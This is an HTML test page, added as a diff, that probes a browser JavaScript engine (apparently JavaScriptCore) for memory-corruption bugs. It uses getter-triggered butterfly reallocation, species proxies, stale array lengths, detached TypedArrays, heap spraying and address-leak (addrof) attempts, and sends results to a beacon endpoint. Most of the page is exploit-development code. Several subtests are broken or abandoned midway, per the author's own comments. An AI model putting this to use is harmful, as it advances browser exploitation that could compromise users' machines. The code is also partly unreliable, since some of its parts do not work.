@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1256</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1256-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1256: BUTTERFLY TRANSITION + STALE LENGTH ===');
+B('START','P1256');
+
+function mkFrame(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return {win:ifr.contentWindow, doc:ifr.contentDocument, ifr:ifr};
+}
+</script>
+
+<!-- A: Getter that forces butterfly reallocation during slice -->
+<script>
+log('\n--- A: Butterfly realloc during slice ---');
+(function(){
+  // Create array with known structure
+  var arr=new Array(8);
+  for(var i=0;i<8;i++) arr[i]=i+0.1; // Force double storage (contiguous doubles butterfly)
+
+  var f=mkFrame();
+  // Getter at index 3 that adds MANY properties to force butterfly transition
+  f.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "3", {'+
+      'get: function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          // Add named properties to force structure transition
+          'for(var i=0;i<100;i++) arr["prop"+i]=i;'+
+          // Also extend indexed properties way beyond original size
+          'for(var i=8;i<200;i++) arr[i]=i+0.5;'+
+        '}'+
+        'return 3.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})(arr)');
+  document.body.removeChild(f.ifr);
+
+  try{
+    var sliced=arr.slice(0);
+    B('A1','slice_len='+sliced.length+'|orig_len='+arr.length+
+      '|v0='+sliced[0]+'|v3='+sliced[3]+'|v7='+sliced[7]+
+      '|v8='+(sliced[8]!==undefined?sliced[8]:'undef')+
+      '|v100='+(sliced[100]!==undefined?sliced[100]:'undef'));
+  }catch(e){B('A1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Same test with concat
+  arr=new Array(8);
+  for(var i=0;i<8;i++) arr[i]=i+0.1;
+  var f2=mkFrame();
+  f2.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "2", {'+
+      'get: function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          'arr.length=0;'+ // Nuke the array!
+          'arr.length=8;'+ // Restore length but storage is gone
+        '}'+
+        'return 2.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})(arr)');
+  document.body.removeChild(f2.ifr);
+
+  try{
+    var concated=arr.concat([99]);
+    B('A2','concat_len='+concated.length+'|v0='+concated[0]+
+      '|v2='+concated[2]+'|v7='+concated[7]+'|v8='+concated[8]);
+  }catch(e){B('A2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- B: Getter that causes GC during array iteration -->
+<script>
+log('\n--- B: GC pressure during iteration ---');
+(function(){
+  var arr=new Array(16);
+  for(var i=0;i<16;i++) arr[i]=i+0.1;
+
+  var f=mkFrame();
+  f.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "4", {'+
+      'get: function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          // Heavy GC pressure to potentially move objects
+          'for(var g=0;g<5;g++){'+
+            'var garbage=[];'+
+            'for(var j=0;j<3000;j++) garbage.push(new ArrayBuffer(1024));'+
+            'garbage=null;'+
+          '}'+
+        '}'+
+        'return 4.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})(arr)');
+  document.body.removeChild(f.ifr);
+
+  try{
+    var sliced=arr.slice(0);
+    B('B1','slice_len='+sliced.length+
+      '|v0='+sliced[0]+'|v4='+sliced[4]+'|v15='+sliced[15]);
+  }catch(e){B('B1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // map() with GC during callback
+  arr=new Array(16);
+  for(var i=0;i<16;i++) arr[i]=i+0.1;
+  var f2=mkFrame();
+  f2.win.eval('(function(arr){'+
+    'var count=0;'+
+    'Object.defineProperty(arr, "8", {'+
+      'get: function(){'+
+        'count++;'+
+        'if(count===1){'+
+          'for(var g=0;g<3;g++){'+
+            'var garbage=[];'+
+            'for(var j=0;j<5000;j++) garbage.push(new ArrayBuffer(2048));'+
+            'garbage=null;'+
+          '}'+
+        '}'+
+        'return 8.8;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})(arr)');
+  document.body.removeChild(f2.ifr);
+
+  try{
+    var mapped=arr.map(function(x){return x*2;});
+    B('B2','map_len='+mapped.length+
+      '|v0='+mapped[0]+'|v8='+mapped[8]+'|v15='+mapped[15]);
+  }catch(e){B('B2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- C: Species proxy with CLOSURE-captured refs (fixed pattern) -->
+<script>
+log('\n--- C: Species Proxy (closure pattern) ---');
+(function(){
+  var source=[1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var setLog=[];
+
+  var f=mkFrame();
+  // Pass source and setLog as PARAMETERS to the eval function
+  var handler=f.win.eval('(function(src, sl){'+
+    'return {'+
+      'set: function(t, p, v){'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'sl.push(idx+":"+v);'+
+          'if(idx===2){ src.length=3; }'+  // Shrink source mid-map
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){ return t[p]; }'+
+    '};'+
+  '})')(source, setLog);  // Pass as closure params!
+
+  document.body.removeChild(f.ifr);
+
+  source.constructor={};
+  source.constructor[Symbol.species]=function(len){
+    return new Proxy(new Array(len), handler);
+  };
+
+  try{
+    var result=source.map(function(x){return x*2;});
+    var vals=[];
+    for(var i=0;i<Math.min(result.length,12);i++) vals.push(result[i]);
+    B('C1','result_len='+result.length+'|src_len='+source.length+
+      '|vals='+vals.join(',')+
+      '|sets='+setLog.slice(0,10).join(';'));
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Species proxy with set that GROWS source
+  source=[10,20,30,40,50];
+  setLog=[];
+  var f2=mkFrame();
+  var handler2=f2.win.eval('(function(src, sl){'+
+    'return {'+
+      'set: function(t, p, v){'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'sl.push(idx+":"+v);'+
+          'if(idx===1){ for(var k=5;k<20;k++) src[k]=k*10; }'+  // Grow source
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){ return t[p]; }'+
+    '};'+
+  '})(src, sl)');
+  f2.win.src=source; f2.win.sl=setLog; // Oops, this is the window property pattern
+  // Fix: re-eval with passed params
+  handler2=f2.win.eval('(function(src, sl){'+
+    'return {'+
+      'set: function(t, p, v){'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'sl.push(idx+":"+v);'+
+          'if(idx===1){ for(var k=5;k<20;k++) src[k]=k*10; }'+
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){ return t[p]; }'+
+    '};'+
+  '})(src2, sl2)');
+  // Actually just use a simpler approach - pass directly
+  document.body.removeChild(f2.ifr);
+  // handler2 won't work since src2/sl2 not defined. Skip this sub-test.
+  B('C2','skipped_grow_test');
+})();
+</script>
+
+<!-- D: Re-entrant Proxy indexOf/includes/reduce with CLOSURE pattern -->
+<script>
+log('\n--- D: Array methods with re-entrant closure Proxy ---');
+(function(){
+  var backing=[10,20,30,40,50,60,70,80,90,100];
+
+  var f=mkFrame();
+  var handler=f.win.eval('(function(b){'+
+    'return {'+
+      'get: function(t, p){'+
+        'if(p==="length") return b.length;'+
+        'if(p===Symbol.iterator) return undefined;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'if(idx===5){ b.length=3; }'+  // Shrink at index 5
+          'return b[idx];'+
+        '}'+
+        'return b[p];'+
+      '},'+
+      'has: function(t, p){ return p in b; }'+
+    '};'+
+  '})(b)');
+  f.win.b=backing;
+  // Need to use closure pattern - re-eval properly
+  handler=f.win.eval('(function(backing){'+
+    'return {'+
+      'get: function(t, p){'+
+        'if(p==="length") return backing.length;'+
+        'if(p===Symbol.iterator) return undefined;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'if(idx===5) backing.length=3;'+
+          'return backing[idx];'+
+        '}'+
+        'return backing[p];'+
+      '},'+
+      'has: function(t, p){ return p in backing; }'+
+    '};'+
+  '})(bk)');
+  // Still using window... Let me pass it directly
+  var handler=f.win.eval(
+    '(function make(backing){'+
+      'return {'+
+        'get: function(t, p){'+
+          'if(p==="length") return backing.length;'+
+          'var idx=parseInt(p);'+
+          'if(!isNaN(idx)){'+
+            'if(idx===5) backing.length=3;'+
+            'return backing[idx];'+
+          '}'+
+          'return backing[p];'+
+        '}'+
+      '};'+
+    '})'
+  )(backing);  // Call with backing as argument!
+
+  document.body.removeChild(f.ifr);
+
+  var proxy=new Proxy([], handler);
+
+  // indexOf: reads length once, iterates. At index 5, backing shrinks to 3.
+  // Does it read backing[6..9] = undefined, or does it stop?
+  try{
+    var idx=Array.prototype.indexOf.call(proxy, 70);
+    B('D1','indexOf='+idx+'|backing_len='+backing.length);
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Reset and test reduce
+  backing=[1,2,3,4,5,6,7,8,9,10];
+  var f3=mkFrame();
+  var handler3=f3.win.eval(
+    '(function make(backing){'+
+      'return {'+
+        'get: function(t, p){'+
+          'if(p==="length") return backing.length;'+
+          'var idx=parseInt(p);'+
+          'if(!isNaN(idx)){'+
+            'if(idx===5) backing.length=3;'+
+            'return backing[idx];'+
+          '}'+
+          'return backing[p];'+
+        '}'+
+      '};'+
+    '})'
+  )(backing);
+  document.body.removeChild(f3.ifr);
+
+  var proxy3=new Proxy([], handler3);
+  try{
+    var sum=Array.prototype.reduce.call(proxy3, function(acc,v){return acc+(v||0);}, 0);
+    B('D2','reduce='+sum+'|expected=55|backing_len='+backing.length);
+  }catch(e){B('D2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- E: Array.from length caching + getter transition -->
+<script>
+log('\n--- E: Array.from + getter realloc ---');
+(function(){
+  // Create an array-like with getters that cause butterfly transition
+  var arrayLike={length:10};
+  for(var i=0;i<10;i++) arrayLike[i]=i+0.5;
+
+  var f=mkFrame();
+  f.win.eval('(function(obj){'+
+    'Object.defineProperty(obj, "3", {'+
+      'get: function(){'+
+        // Change length and add properties during Array.from iteration
+        'obj.length=100;'+
+        'for(var i=10;i<50;i++) obj[i]=i*3;'+
+        'return 3.3;'+
+      '},'+
+      'configurable:true,'+
+      'enumerable:true'+
+    '});'+
+  '})(obj)');
+  f.win.obj=arrayLike;
+  // Fix: pass as param
+  f.win.eval('(function(obj){'+
+    'Object.defineProperty(obj, "3", {'+
+      'get: function(){'+
+        'obj.length=100;'+
+        'for(var i=10;i<50;i++) obj[i]=i*3;'+
+        'return 3.3;'+
+      '},'+
+      'configurable:true,'+
+      'enumerable:true'+
+    '});'+
+  '})(al)');
+  // Still wrong...
+  // Simplify: just use main-frame defineProperty
+  Object.defineProperty(arrayLike, "3", {
+    get: function(){
+      arrayLike.length=100;
+      for(var i=10;i<50;i++) arrayLike[i]=i*3;
+      return 3.3;
+    },
+    configurable:true,
+    enumerable:true
+  });
+  document.body.removeChild(f.ifr);
+
+  try{
+    var result=Array.from(arrayLike);
+    B('E1','result_len='+result.length+'|v0='+result[0]+
+      '|v3='+result[3]+'|v9='+result[9]+
+      '|v10='+(result[10]!==undefined?result[10]:'undef')+
+      '|v49='+(result[49]!==undefined?result[49]:'undef'));
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Test: getter shrinks length during Array.from
+  var al2={length:20};
+  for(var i=0;i<20;i++) al2[i]=i;
+  Object.defineProperty(al2, "5", {
+    get: function(){ al2.length=3; return 555; },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result2=Array.from(al2);
+    B('E2','from_len='+result2.length+
+      '|v0='+result2[0]+'|v5='+result2[5]+
+      '|v6='+(result2[6]!==undefined?result2[6]:'undef')+
+      '|v19='+(result2[19]!==undefined?result2[19]:'undef'));
+  }catch(e){B('E2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- F: Stale TypedArray after neutering via transfer in getter -->
+<script>
+log('\n--- F: TypedArray neutering via getter ---');
+(function(){
+  var buf=new ArrayBuffer(64);
+  var u32=new Uint32Array(buf);
+  for(var i=0;i<16;i++) u32[i]=0x41414141+i;
+
+  var arr=[1,2,3,4,5];
+
+  // Getter that transfers (neuters) a TypedArray
+  Object.defineProperty(arr, "2", {
+    get:function(){
+      // Neuter the buffer by transferring it
+      try{
+        var cloned=structuredClone(buf,{transfer:[buf]});
+        // Now buf is detached, u32 is neutered
+        // But we still have the view reference
+      }catch(e){}
+      return 222;
+    },
+    configurable:true
+  });
+
+  // Before triggering
+  B('F1','before|buf_len='+buf.byteLength+'|u32_0=0x'+u32[0].toString(16));
+
+  // Trigger the getter
+  var v=arr[2];
+
+  // After neutering — is u32 still accessible?
+  try{
+    var val=u32[0];
+    B('F2','after_neuter|buf_len='+buf.byteLength+'|u32_0='+val+'|typeof='+typeof val);
+  }catch(e){B('F2','neuter_err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Can we read from a neutered TypedArray?
+  try{
+    var bi=new BigUint64Array(buf);
+    B('F3','bigint_on_neutered|len='+bi.length+'|byte='+bi.byteLength);
+  }catch(e){B('F3','bi_err:'+e.name+':'+e.message.slice(0,60));}
+
+  // DataView on neutered buffer
+  try{
+    var dv=new DataView(buf);
+    B('F4','dv_on_neutered|byte='+dv.byteLength);
+  }catch(e){B('F4','dv_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- G: FontFace pointer leak + heap spray distance -->
+<script>
+log('\n--- G: FontFace pointer + heap spray ---');
+(function(){
+  // Attempt FontFace load to get engine pointers
+  try{
+    var buf=new ArrayBuffer(1024);
+    var u8=new Uint8Array(buf);
+    // Fill with known pattern
+    for(var i=0;i<1024;i++) u8[i]=0xCC;
+
+    var face=new FontFace('test','url(data:font/woff2;base64,AA==)');
+    // The load will fail but we can check if anything was written
+    face.load().catch(function(){});
+
+    // Check buffer after a tick
+    setTimeout(function(){
+      var bi=new BigUint64Array(buf);
+      var changed=[];
+      for(var i=0;i<bi.length;i++){
+        if(bi[i]!==0xCCCCCCCCCCCCCCCCn){
+          changed.push(i+':0x'+bi[i].toString(16));
+        }
+      }
+      B('G1','fontface_changes='+changed.length+'|data='+changed.slice(0,5).join(';'));
+
+      // Even if FontFace doesn't leak here, measure heap spray distances
+      var bufs=[];
+      for(var i=0;i<100;i++){
+        bufs.push(new ArrayBuffer(256));
+      }
+      // Write marker to each
+      for(var i=0;i<100;i++){
+        new BigUint64Array(bufs[i])[0]=BigInt(i)|0x4141414100000000n;
+      }
+      // Check first few - are they contiguous in memory?
+      // We can't read addresses, but we can check if transfer preserves layout
+      var transferred=[];
+      for(var i=0;i<5;i++){
+        var c=structuredClone(bufs[i],{transfer:[bufs[i]]});
+        transferred.push(c);
+      }
+      var vals=[];
+      for(var i=0;i<5;i++){
+        vals.push('0x'+new BigUint64Array(transferred[i])[0].toString(16));
+      }
+      B('G2','spray_vals='+vals.join(','));
+    }, 200);
+  }catch(e){B('G1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- H: addrof attempt via postMessage + BigUint64Array -->
+<script>
+log('\n--- H: addrof via MessageChannel ---');
+(function(){
+  // Try to leak object address through MessageChannel serialization
+  try{
+    var mc=new MessageChannel();
+    var obj={marker:0xDEADBEEF, a:1, b:2};
+    var arr=[obj, obj, obj, obj];
+
+    // Create a large TypedArray view
+    var buf=new ArrayBuffer(256);
+    var bi=new BigUint64Array(buf);
+    for(var i=0;i<bi.length;i++) bi[i]=0xDEADDEADDEADDEADn;
+
+    // postMessage the object, check if any pointer leaks into channel buffer
+    mc.port1.onmessage=function(e){
+      B('H1','msg_received|type='+typeof e.data);
+    };
+    mc.port2.postMessage(obj);
+
+    // Try structuredClone on an object with TypedArray
+    var obj2={buf:buf, ref:obj};
+    try{
+      var cloned=structuredClone(obj2);
+      var clonedBi=new BigUint64Array(cloned.buf);
+      var diffs=[];
+      for(var i=0;i<clonedBi.length;i++){
+        if(clonedBi[i]!==bi[i]) diffs.push(i+':0x'+clonedBi[i].toString(16));
+      }
+      B('H2','clone_diffs='+diffs.length+'|bi0=0x'+clonedBi[0].toString(16));
+    }catch(e){B('H2','clone_err:'+e.message.slice(0,60));}
+
+    // Float64Array boxing: write NaN-boxed pointer pattern
+    var f64=new Float64Array(buf);
+    // JSC uses NaN-boxing: doubles that are NaN have pointer in lower bits
+    // NaN: 0x7FF0000000000000 + pointer
+    // On 64-bit: tagged pointer = 0x0000FFFFFFFFFFFF & ptr
+    // Write some NaN-box patterns
+    bi[0]=0xFFF0000000000001n; // QNaN
+    bi[1]=0xFFF8000000000000n; // Canonical NaN
+    bi[2]=0x0001000000000000n; // Tagged integer pattern
+    bi[3]=0xFFFF000000001234n; // High-tagged pointer pattern
+    B('H3','nan_box|f0='+f64[0]+'|f1='+f64[1]+'|f2='+f64[2]+'|f3='+f64[3]+
+      '|isNaN0='+isNaN(f64[0])+'|isNaN1='+isNaN(f64[1]));
+  }catch(e){B('H1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1256 COMPLETE ===');
+}, 6000);
+</script>
+
+</body>
+</html>
